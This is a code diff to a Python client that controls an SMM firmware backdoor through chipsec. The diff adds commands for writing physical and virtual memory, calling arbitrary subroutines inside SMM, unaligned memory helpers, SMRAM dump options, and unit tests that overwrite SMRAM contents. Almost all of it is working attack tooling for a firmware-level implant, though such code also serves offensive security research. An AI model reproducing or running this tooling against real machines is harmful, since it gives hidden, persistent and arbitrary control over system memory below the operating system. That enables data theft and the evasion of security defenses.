@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import sys, os, shutil
+import sys, os, time, shutil, unittest
 from struct import pack, unpack
 from optparse import OptionParser, make_option
 
@@ -8,13 +8,18 @@ from optparse import OptionParser, make_option
 BACKDOOR_SW_SMI_VAL = 0xCC
 
 # SW SMI commands for backdoor
-BACKDOOR_SW_DATA_PING           = 0 # test for allive SMM backdoor
-BACKDOOR_SW_DATA_READ_PHYS_MEM  = 1 # read physical memory command
-BACKDOOR_SW_DATA_READ_VIRT_MEM  = 2 # read virtual memory command
-BACKDOOR_SW_DATA_WRITE_PHYS_MEM = 3 # write physical memory command
-BACKDOOR_SW_DATA_WRITE_VIRT_MEM = 4 # write virtual memory command
-BACKDOOR_SW_DATA_TIMER_ENABLE   = 5 # enable periodic timer handler
-BACKDOOR_SW_DATA_TIMER_DISABLE  = 6 # disable periodic timer handler
+BACKDOOR_SW_DATA_PING               = 0     # test for allive SMM backdoor
+BACKDOOR_SW_DATA_READ_PHYS_PAGE     = 1     # read physical memory command
+BACKDOOR_SW_DATA_READ_VIRT_PAGE     = 2     # read virtual memory command
+BACKDOOR_SW_DATA_WRITE_PHYS_PAGE    = 3     # write physical memory command
+BACKDOOR_SW_DATA_WRITE_VIRT_PAGE    = 4     # write virtual memory command
+BACKDOOR_SW_DATA_TIMER_ENABLE       = 5     # enable periodic timer handler
+BACKDOOR_SW_DATA_TIMER_DISABLE      = 6     # disable periodic timer handler
+BACKDOOR_SW_DATA_CALL               = 7     # call specified subroutine
+BACKDOOR_SW_DATA_READ_PHYS_DWORD    = 9     # read physical memory dowrd command
+BACKDOOR_SW_DATA_READ_VIRT_DWORD    = 10    # read virtual memory dowrd command
+BACKDOOR_SW_DATA_WRITE_PHYS_DWORD   = 11    # write physical memory dowrd command
+BACKDOOR_SW_DATA_WRITE_VIRT_DWORD   = 12    # write virtual memory dowrd command
 
 # See struct _INFECTOR_CONFIG in SmmBackdoor.h
 INFECTOR_CONFIG_SECTION = '.conf'
@@ -33,6 +38,9 @@ BACKDOOR_INFO_LEN = 8 * 5
 BACKDOOR_INFO_FULL = 0xFFFFFFFF
 
 PAGE_SIZE = 0x1000
+
+align_up = lambda x, a: ((x + a - 1) // a) * a
+align_down = lambda x, a: (x // a) * a
 
 cs = None
 
@@ -80,10 +88,20 @@ class ChipsecWrapper(object):
         # read memory contents
         return self.mem.read_physical_mem(addr, size)
 
+    def mem_write(self, addr, data): 
+
+        # write memory contents
+        return self.mem.write_physical_mem(addr, len(data), data)
+
     mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
     mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
     mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
     mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]
+
+    mem_write_1 = lambda self, addr, v: self.mem_write(addr, pack('B', v))
+    mem_write_2 = lambda self, addr, v: self.mem_write(addr, pack('H', v))
+    mem_write_4 = lambda self, addr, v: self.mem_write(addr, pack('I', v))
+    mem_write_8 = lambda self, addr, v: self.mem_write(addr, pack('Q', v))
 
     def send_sw_smi(self, command, data, arg):
 
@@ -102,11 +120,15 @@ def get_backdoor_info(addr = None):
     # read _BACKDOOR_INFO structure contents
     return unpack(BACKDOOR_INFO_FMT, cs.mem_read(addr, BACKDOOR_INFO_LEN))
 
-def get_backdoor_info_mem(addr = None):
+def get_backdoor_info_mem(addr = None, size = None):
 
     addr = get_backdoor_info_addr() if addr is None else addr
+    size = PAGE_SIZE if size is None else size
 
-    return cs.mem_read(addr + PAGE_SIZE, PAGE_SIZE)
+    # read whole page to avoid caching issues (damn chipsec)
+    data = cs.mem_read(addr + PAGE_SIZE, PAGE_SIZE)
+
+    return data[: size]
 
 def get_smram_info():
 
@@ -147,16 +169,66 @@ def backdoor_ctl(code, arg):
 def backdoor_read_virt_page(addr):
 
     # read virtual memory page
-    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_MEM, addr)
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_PAGE, addr)
         
     return get_backdoor_info_mem()
 
 def backdoor_read_phys_page(addr):
 
     # read physical memory page
-    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, addr)
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_PAGE, addr)
         
     return get_backdoor_info_mem()
+
+def backdoor_write_virt_page(addr, data):
+
+    assert len(data) == PAGE_SIZE
+
+    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)
+
+    # write virtual memory page
+    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_VIRT_PAGE, addr)
+
+def backdoor_write_phys_page(addr, data):
+
+    assert len(data) == PAGE_SIZE
+
+    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)
+
+    # write physical memory page
+    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_PHYS_PAGE, addr)
+
+def backdoor_read_virt_dword(addr):
+
+    # read virtual memory dword
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_DWORD, addr)
+        
+    return get_backdoor_info_mem(size = 4)
+
+def backdoor_read_phys_dword(addr):
+
+    # read physical memory dword
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_DWORD, addr)
+        
+    return get_backdoor_info_mem(size = 4)
+
+def backdoor_write_virt_dword(addr, data):
+
+    assert len(data) == 4
+
+    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)
+
+    # write virtual memory dword
+    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_VIRT_DWORD, addr)
+
+def backdoor_write_phys_dword(addr, data):
+
+    assert len(data) == 4
+
+    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)
+
+    # write physical memory dword
+    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_PHYS_DWORD, addr)
 
 def backdoor_timer_enable():
 
@@ -168,6 +240,85 @@ def backdoor_timer_disable():
     # disable periodic timer SMI handler
     backdoor_ctl(BACKDOOR_SW_DATA_TIMER_DISABLE, 0)
 
+def backdoor_call(addr):
+
+    # call specified subroutine
+    backdoor_ctl(BACKDOOR_SW_DATA_CALL, addr)
+
+def _backdoor_read_mem(addr, size, virt = False):
+
+    align, data = 4, ''
+
+    read_addr = align_down(addr, align)
+    read_size = align_up(size, align) + align
+
+    ptr = addr - read_addr
+
+    # perform memory reads
+    for i in range(0, read_size / align):
+        
+        if virt:
+
+            data += backdoor_read_virt_dword(read_addr + (i * align))
+
+        else:
+
+            data += backdoor_read_phys_dword(read_addr + (i * align))
+
+    # align memory read request by 4 byte boundary
+    return data[ptr : ptr + size]
+
+def _backdoor_write_mem(addr, data, virt = False):
+
+    align, size = 4, len(data)
+
+    write_addr = align_down(addr, align)
+    write_size = align_up(size, align) + align
+
+    # read existing data
+    write_data = _backdoor_read_mem(write_addr, write_size, virt = virt)
+
+    ptr = addr - write_addr
+
+    # align memory write request by 4 byte boundary
+    data = write_data[: ptr] + data + write_data[ptr + size :]
+
+    for i in range(0, write_size / align):
+
+        if virt:
+
+            backdoor_write_virt_dword(write_addr + (i * align), data[i * align : (i + 1) * align])
+
+        else:
+
+            backdoor_write_phys_dword(write_addr + (i * align), data[i * align : (i + 1) * align])
+
+read_phys_mem = lambda addr, size: _backdoor_read_mem(addr, size, virt = False)
+read_virt_mem = lambda addr, size: _backdoor_read_mem(addr, size, virt = True)
+
+write_phys_mem = lambda addr, data: _backdoor_write_mem(addr, data, virt = False)
+write_virt_mem = lambda addr, data: _backdoor_write_mem(addr, data, virt = True)
+
+write_phys_mem_1 = lambda addr, v: write_phys_mem(addr, pack('B', v))
+write_phys_mem_2 = lambda addr, v: write_phys_mem(addr, pack('H', v))
+write_phys_mem_4 = lambda addr, v: write_phys_mem(addr, pack('I', v))
+write_phys_mem_8 = lambda addr, v: write_phys_mem(addr, pack('Q', v))
+
+write_virt_mem_1 = lambda addr, v: write_virt_mem(addr, pack('B', v))
+write_virt_mem_2 = lambda addr, v: write_virt_mem(addr, pack('H', v))
+write_virt_mem_4 = lambda addr, v: write_virt_mem(addr, pack('I', v))
+write_virt_mem_8 = lambda addr, v: write_virt_mem(addr, pack('Q', v))
+
+read_phys_mem_1 = lambda addr: unpack('B', read_phys_mem(addr, 1))[0]
+read_phys_mem_2 = lambda addr: unpack('H', read_phys_mem(addr, 2))[0]
+read_phys_mem_4 = lambda addr: unpack('I', read_phys_mem(addr, 4))[0]
+read_phys_mem_8 = lambda addr: unpack('Q', read_phys_mem(addr, 8))[0]
+
+read_virt_mem_1 = lambda addr: unpack('B', read_virt_mem(addr, 1))[0]
+read_virt_mem_2 = lambda addr: unpack('H', read_virt_mem(addr, 2))[0]
+read_virt_mem_4 = lambda addr: unpack('I', read_virt_mem(addr, 4))[0]
+read_virt_mem_8 = lambda addr: unpack('Q', read_virt_mem(addr, 8))[0]
+
 def dump_mem_page(addr, count = None):
 
     ret = ''
@@ -178,7 +329,7 @@ def dump_mem_page(addr, count = None):
 
         # send read memory page command to SMM code
         page_addr = addr + PAGE_SIZE * i
-        backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)
+        backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_PAGE, page_addr)
 
         _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
         if last_status != 0:
@@ -448,12 +599,97 @@ def hexdump(data, width = 16, addr = 0):
 
     return ret
 
-def chipsec_init():
+def init():
 
     global cs    
+
+    if cs is None:
     
-    # initialize chipsec
-    cs = ChipsecWrapper()
+        # initialize chipsec
+        cs = ChipsecWrapper()
+
+class MemoryAccessTest(unittest.TestCase):
+
+    def __init__(self, method):
+
+        init()
+
+        super(MemoryAccessTest, self).__init__(method)
+
+    def smram_start(self):
+        ''' Get address of the first SMRAM region. '''
+
+        return get_smram_info()[0][0]        
+
+    def test_mem(self):
+        ''' Test regular memory read/write operations. '''
+
+        addr = self.smram_start()
+
+        data = read_phys_mem(addr, 0x20)
+
+        write_phys_mem(addr, data)
+
+    def test_normal(self, addr = None):
+        ''' Test byte/word/dword/qword memory operations. '''
+
+        addr = self.smram_start() if addr is None else addr
+
+        val = 0x0102030405060708
+
+        old = read_phys_mem_8(addr)
+
+        write_phys_mem_8(addr, val)
+
+        assert read_phys_mem_1(addr) == val & 0xff
+        assert read_phys_mem_2(addr) == val & 0xffff
+        assert read_phys_mem_4(addr) == val & 0xffffffff
+        assert read_phys_mem_8(addr) == val
+
+        write_phys_mem_8(addr, old)
+
+    def test_unaligned(self, addr = None):
+        ''' Test unaligned memory operations. '''
+
+        addr = self.smram_start() if addr is None else addr
+
+        val = int(time.time())
+
+        old = read_phys_mem_8(addr)
+
+        write_phys_mem_8(addr, 0)
+        write_phys_mem_4(addr + 1, val)
+
+        assert read_phys_mem_8(addr) == val << 8
+
+        write_phys_mem_8(addr, 0)
+        write_phys_mem_4(addr + 2, val)
+
+        assert read_phys_mem_8(addr) == val << 16
+
+        write_phys_mem_8(addr, 0)
+        write_phys_mem_4(addr + 3, val)
+
+        assert read_phys_mem_8(addr) == val << 24
+
+        write_phys_mem_8(addr, old)
+
+    def test_cross_page(self):
+        ''' Test cross page boundary memory operations. '''
+
+        addr = self.smram_start() + PAGE_SIZE
+
+        self.test_normal(addr = addr - 1)
+        
+        self.test_unaligned(addr = addr - 2)
+
+        self.test_normal(addr = addr - 2)
+        
+        self.test_unaligned(addr = addr - 3)
+
+        self.test_normal(addr = addr - 3)
+        
+        self.test_unaligned(addr = addr - 4)
 
 def main():    
 
@@ -474,11 +710,14 @@ def main():
         make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
             help = 'dump SMRAM contents into the file'), 
 
+        make_option('-s', '--size', dest = 'size', default = PAGE_SIZE,
+            help = 'read size for --read-phys and --read-virt'),
+
         make_option('--read-phys', dest = 'read_phys', default = None,
             help = 'read physical memory page'),
 
         make_option('--read-virt', dest = 'read_virt', default = None,
-            help = 'read virtual memory page'),
+            help = 'read virtual memory page'),        
 
         make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
             help = 'enable periodic timer SMI handler'),
@@ -521,46 +760,48 @@ def main():
 
     elif options.test:
 
-        chipsec_init()
+        init()
         check_system()
 
         return 0
 
     elif options.dump_smram:
 
-        chipsec_init()
+        init()
         dump_smram()
 
         return 0
 
     elif options.read_phys is not None:
 
-        addr = int(options.read_phys, 16)
+        size = int(options.size, 16)
+        addr = int(options.read_phys, 16)        
 
-        chipsec_init()
-        print(hexdump(backdoor_read_phys_page(addr), addr = addr))
+        init()
+        print(hexdump(read_phys_mem(addr, size), addr = addr))
 
         return 0
 
     elif options.read_virt is not None:
 
+        size = int(options.size, 16)
         addr = int(options.read_virt, 16)
 
-        chipsec_init()
-        print(hexdump(backdoor_read_virt_page(addr), addr = addr))
+        init()
+        print(hexdump(read_virt_mem(addr, size), addr = addr))
 
         return 0
 
     elif options.timer_enable:
 
-        chipsec_init()
+        init()
         backdoor_timer_enable()
         
         return 0
 
     elif options.timer_disable:
 
-        chipsec_init()
+        init()
         backdoor_timer_disable()
 
         return 0    
@@ -568,10 +809,8 @@ def main():
     else:
 
         print('[!] No actions specified, try --help')
-        return -1
-
-# def end
-
+        return -1    
+    
 if __name__ == '__main__':
     
     sys.exit(main())
